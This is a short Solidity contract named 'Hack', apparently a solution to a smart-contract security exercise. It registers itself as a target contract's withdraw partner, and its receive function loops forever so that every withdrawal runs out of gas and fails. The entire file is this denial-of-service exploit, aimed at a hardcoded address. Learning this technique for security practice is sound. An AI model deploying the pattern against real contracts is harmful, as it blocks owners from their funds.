// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ITarget {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint256);
    receive() external payable;
}

contract Hack {
    event Log(uint256);
    ITarget public target = ITarget(payable(0xf3eE3C4Ec25e8414838567818A30C90c7d62f834));
    constructor() {

    }

    function hack() public {
            target.setWithdrawPartner(address(this));

    }

    receive() external payable {
        while (true) {
        emit Log(gasleft());
        }

    }


}